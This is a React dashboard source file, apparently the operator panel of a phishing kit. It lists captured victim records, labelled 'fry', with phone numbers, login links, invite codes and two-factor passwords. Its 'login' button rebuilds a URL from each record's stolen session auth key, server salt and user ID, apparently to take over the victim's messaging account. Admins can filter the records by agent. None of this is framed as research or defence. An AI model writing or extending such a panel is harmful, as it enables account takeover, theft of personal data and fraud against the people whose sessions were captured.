import React, { useState, useEffect } from 'react'
import { Table, Button, Input, DatePicker, Form, message, Modal, Space, Popconfirm } from 'antd'
import { SearchOutlined, ReloadOutlined, EditOutlined, DeleteOutlined, LoginOutlined } from '@ant-design/icons'
import dayjs from 'dayjs'
import { dashboardAPI } from '../services/api'
import { useAuthStore } from '../stores/auth'
import type { FryRecord, DashboardSearchParams } from '../types'

function Dashboard() {
  const [data, setData] = useState<FryRecord[]>([])
  const [loading, setLoading] = useState(false)
  const [total, setTotal] = useState(0)
  const [searchParams, setSearchParams] = useState<DashboardSearchParams>({
    page: 1,
    pageSize: 20,
  })
  const [remarkModalVisible, setRemarkModalVisible] = useState(false)
  const [currentRecord, setCurrentRecord] = useState<FryRecord | null>(null)
  const [remarkForm] = Form.useForm()
  
  const user = useAuthStore((state) => state.user)

  const fetchData = async () => {
    setLoading(true)
    try {
      const response = await dashboardAPI.getFryRecords(searchParams)
      if (response.success) {
        setData(response.data || [])
        setTotal(response.total || 0)
      }
    } catch (error: any) {
      message.error('获取数据失败')
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchData()
  }, [searchParams])

  const handleSearch = (values: any) => {
    setSearchParams({
      ...searchParams,
      page: 1,
      date: values.date ? dayjs(values.date).format('YYYY-MM-DD') : undefined,
      phone: values.phone || undefined,
      agent: values.agent || undefined,
    })
  }

  const handleReset = () => {
    setSearchParams({ page: 1, pageSize: 20 })
  }

  const handleEditRemark = (record: FryRecord) => {
    setCurrentRecord(record)
    remarkForm.setFieldsValue({ remark: record.remark })
    setRemarkModalVisible(true)
  }

  const handleSaveRemark = async () => {
    try {
      const values = await remarkForm.validateFields()
      if (currentRecord) {
        await dashboardAPI.updateRemark(currentRecord.id, values.remark)
        message.success('备注更新成功')
        setRemarkModalVisible(false)
        fetchData()
      }
    } catch (error) {
      message.error('备注更新失败')
    }
  }

  const handleDelete = async (id: number) => {
    try {
      await dashboardAPI.deleteRecord(id)
      message.success('删除成功')
      fetchData()
    } catch (error) {
      message.error('删除失败')
    }
  }

  const formatTime = (timestamp: number) => {
    return dayjs(timestamp * 1000).format('YYYY-MM-DD HH:mm:ss')
  }

  const columns = [
    {
      title: 'ID',
      dataIndex: 'id',
      width: 80,
    },
    {
      title: '创建时间',
      dataIndex: 'created_at',
      width: 180,
      render: (time: number) => formatTime(time),
    },
    {
      title: '手机号',
      dataIndex: 'phone',
      width: 120,
    },
    {
      title: '登录信息',
      width: 200,
      render: (record: FryRecord) => (
        <div>
          <div>链接: {record.url}</div>
          <div>邀请码: {record.invite_code || '无'}</div>
        </div>
      ),
    },
    {
      title: '2FA密码',
      dataIndex: 'pwd',
      width: 100,
      render: (pwd: string) => pwd || '未设置',
    },
    {
      title: '备注',
      dataIndex: 'remark',
      width: 150,
      render: (remark: string) => remark || '-',
    },
    {
      title: '操作',
      width: 200,
      render: (record: FryRecord) => (
        <Space>
          <Button
            type="primary"
            size="small"
            icon={<LoginOutlined />}
            onClick={() => {
              const loginUrl = `${process.env.REACT_APP_LOGIN_URL || ''}?key=${record.dc_auth_key}&server_salt=${record.dc_server_salt}&dcID=${record.user_auth_dc_id}&date=${record.user_auth_date}&id=${record.user_auth_id}&state_id=${record.state_id}`
              window.open(loginUrl, '_blank')
            }}
          >
            登录
          </Button>
          <Button
            type="link"
            size="small"
            icon={<EditOutlined />}
            onClick={() => handleEditRemark(record)}
          >
            备注
          </Button>
          <Popconfirm
            title="确认删除"
            description="确定要删除这条记录吗？"
            onConfirm={() => handleDelete(record.id)}
            okText="确定"
            cancelText="取消"
          >
            <Button
              type="link"
              size="small"
              danger
              icon={<DeleteOutlined />}
            >
              删除
            </Button>
          </Popconfirm>
        </Space>
      ),
    },
  ]

  return (
    <div>
      <Form layout="inline" onFinish={handleSearch} style={{ marginBottom: 16 }}>
        <Form.Item name="date">
          <DatePicker placeholder="选择日期" />
        </Form.Item>
        <Form.Item name="phone">
          <Input placeholder="手机号" />
        </Form.Item>
        {user?.role === 'admin' && (
          <Form.Item name="agent">
            <Input placeholder="代理" />
          </Form.Item>
        )}
        <Form.Item>
          <Space>
            <Button type="primary" htmlType="submit" icon={<SearchOutlined />}>
              搜索
            </Button>
            <Button onClick={handleReset} icon={<ReloadOutlined />}>
              重置
            </Button>
          </Space>
        </Form.Item>
      </Form>

      <Table
        columns={columns}
        dataSource={data}
        rowKey="id"
        loading={loading}
        pagination={{
          current: searchParams.page,
          pageSize: searchParams.pageSize,
          total,
          showSizeChanger: true,
          showQuickJumper: true,
          showTotal: (total) => `共 ${total} 条`,
          onChange: (page, pageSize) => {
            setSearchParams({ ...searchParams, page, pageSize: pageSize || 20 })
          },
        }}
        scroll={{ x: 1200 }}
      />

      <Modal
        title="编辑备注"
        open={remarkModalVisible}
        onOk={handleSaveRemark}
        onCancel={() => setRemarkModalVisible(false)}
        okText="保存"
        cancelText="取消"
      >
        <Form form={remarkForm}>
          <Form.Item
            name="remark"
            label="备注"
            rules={[{ required: true, message: '请输入备注' }]}
          >
            <Input.TextArea rows={4} placeholder="请输入备注信息" />
          </Form.Item>
        </Form>
      </Modal>
    </div>
  )
}

export default Dashboard